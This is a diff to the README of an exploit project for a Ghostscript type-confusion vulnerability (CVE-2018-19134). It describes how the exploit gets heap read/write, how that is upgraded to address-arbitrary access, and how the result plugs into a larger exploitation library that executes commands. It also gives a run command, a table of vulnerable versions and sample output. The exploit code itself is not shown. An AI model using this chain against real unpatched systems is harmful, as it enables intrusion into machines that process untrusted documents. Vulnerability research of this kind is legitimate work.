@@ -1,6 +1,6 @@
 # cve-2018-19134_ghostscript_arbitrary_rw_demo
 
-Demonstrates arbitrary read/write over Ghostscript's heap by exploiting a type confusion in `zsetcolor` (CVE-2018-19134, fixed in Ghostscript 9.26).
+Exploits a type confusion in `zsetcolor` (CVE-2018-19134, fixed in Ghostscript 9.26) to produce address-arbitrary read/write matching the [ghostscript_exploitation_library](https://github.com/w0ot-net/ghostscript_exploitation_library) API contract.
 
 ## How it works
 
@@ -10,7 +10,9 @@ Demonstrates arbitrary read/write over Ghostscript's heap by exploiting a type c
 
 **TAS mode** (GS 9.08–9.25): `osp` overlaps a ref's `type_attrs` field. Repeated `setpattern` calls subtract 16 from `type_attrs` until it wraps from `t_array` (4) to `t_string` (18), converting the array into a string whose `value.bytes` pointer still addresses the original ref storage — exposing it as raw bytes for direct byte-level read/write.
 
-**VALUE mode** (GS 8.64–9.07): `osp` overlaps a ref's `value` field (the element pointer). Each `setpattern` call shifts the array's view backward over heap memory by `sizeof(ref)` per `zpop` call, providing ref-level read/write across object boundaries.
+A master/slave upgrade then turns this ~32KB window into full address-arbitrary r/w: a slave string's ref struct within the window is repointed on each call by overwriting its `value.bytes` field through the master, and re-fetched via a `getinterval` sub-array that shares the underlying storage. This produces `read_bytes(addr, len)` and `write_bytes(addr, bytes)` matching the library's `rw_init` contract. A leaked code pointer (`zput` address from arr[0]'s ref struct) is provided as `code_ptr`.
+
+**VALUE mode** (GS 8.64–9.07): `osp` overlaps a ref's `value` field (the element pointer). Each `setpattern` call shifts the array's view backward over heap memory by `sizeof(ref)` per `zpop` call, providing ref-level read/write across object boundaries. VALUE mode does not produce address-arbitrary byte-level access and cannot integrate with the library.
 
 ## Setup
 
@@ -26,58 +28,70 @@ cp gs.conf.example gs.conf
 
 ## Running
 
+Standalone (demo output):
+
 ```bash
 ./run.sh
 ```
 
+With the exploitation library (registers `rw_init`, enables `mem_*` / ELF / `gs_exec`):
+
+```bash
+source gs.conf
+$GS_RUN $GS_VERSION -- -dNOSAFER -dBATCH -dNOPAUSE -dNODISPLAY -dQUIET \
+    /path/to/library.ps /work/exploit.ps
+```
+
+When `library.ps` is loaded first, the exploit auto-detects the library and calls `rw_init` with `read_bytes`, `write_bytes`, `code_ptr`, and `scratch`. Subsequent PostScript can then use the full `mem_*` API, ELF resolution, and `gs_exec`.
+
 ## Tested versions
 
-| Version | Mode | op_stack.p offset | Result |
-|---------|------|-------------------|--------|
+| Version | Mode | op_stack.p offset | Library |
+|---------|------|-------------------|---------|
 | 8.63 | — | — | setpattern path does not reach vulnerable code |
-| 8.64 | VALUE | pinst[31] (504) | arbitrary ref-level r/w |
-| 8.71 | VALUE | pinst[31] (504) | arbitrary ref-level r/w |
-| 9.01 | VALUE | pinst[38] (616) | arbitrary ref-level r/w |
-| 9.06 | VALUE | pinst[38] (616) | arbitrary ref-level r/w |
-| 9.10 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
-| 9.14 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
-| 9.18 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
-| 9.20 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
-| 9.22 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
+| 8.64 | VALUE | pinst[31] (504) | no (ref-level only) |
+| 8.71 | VALUE | pinst[31] (504) | no (ref-level only) |
+| 9.01 | VALUE | pinst[38] (616) | no (32-bit integers) |
+| 9.06 | VALUE | pinst[38] (616) | no (ref-level only) |
+| 9.10 | TAS | pinst[39] (624) | **rw_init OK** |
+| 9.14 | TAS | pinst[39] (624) | **rw_init OK** |
+| 9.18 | TAS | pinst[39] (624) | **rw_init OK** |
+| 9.20 | TAS | pinst[39] (624) | **rw_init OK** |
+| 9.22 | TAS | pinst[39] (624) | **rw_init OK** |
 | 9.26 | — | — | patched |
 
 The exploit auto-detects the correct offset and mode at runtime.
 
-## Example output (GS 9.18, TAS mode)
+## Example output (GS 9.18, TAS mode with library)
 
 ```
 CVE-2018-19134 type confusion succeeded after 1288 iterations.
 Mode: TAS at pinst[39]  (byte offset 624)
+code_ptr: 0x00007A11A5BF20C0
+mem_base: 0x000000001BE962C8
+read_bytes / write_bytes registered (address-arbitrary r/w).
 
-=== ARBITRARY READ ===
-Reading raw bytes of arr[0] ref struct (16 bytes):
-
-  82 0F xx xx F6 02 00 00  xx xx xx xx xx xx 00 00
-
-  Bytes 0-7  : type_attrs | pad | rsize  (ref header)
-  Bytes 8-15 : value.opproc               (zput address)
-
-Function pointer to zput: 0x0000xxxxxxxxxxxx
-
-=== ARBITRARY WRITE ===
-Writing DE AD BE EF at byte offset 32:
-
-  Read-back: DE AD BE EF
-
-=== RESULT ===
-Arbitrary byte-level read/write over 32766 bytes of Ghostscript heap memory.
+[+] rw_init succeeded -- library seam active.
 ```
 
-## Example output (GS 9.01, VALUE mode)
+## Example output (GS 9.18, TAS mode standalone)
+
+```
+CVE-2018-19134 type confusion succeeded after 1288 iterations.
+Mode: TAS at pinst[39]  (byte offset 624)
+code_ptr: 0x000076ABE587D0C0
+mem_base: 0x000000003289D058
+read_bytes / write_bytes registered (address-arbitrary r/w).
+
+[*] library not loaded; read_bytes / write_bytes available for manual use.
+[*] To activate the full exploitation chain, load library.ps before this file.
+```
+
+## Example output (GS 8.64, VALUE mode)
 
 ```
 CVE-2018-19134 pointer-shift primitive established.
-Mode: VALUE at pinst[38]  (byte offset 616)
+Mode: VALUE at pinst[31]  (byte offset 504)
 Shift rate: 3 refs (48 bytes) per setpattern call
 
 === ARBITRARY WRITE ===
@@ -95,6 +109,9 @@ Reading 3 refs (48 bytes) before arr's original storage:
 
 === RESULT ===
 Arbitrary ref-level read/write over 524320 bytes of Ghostscript heap memory.
+
+NOTE: VALUE mode provides ref-level access only.
+The library API requires address-arbitrary byte-level r/w (TAS mode, GS 9.10-9.25).
 ```
 
 ## Acknowledgments
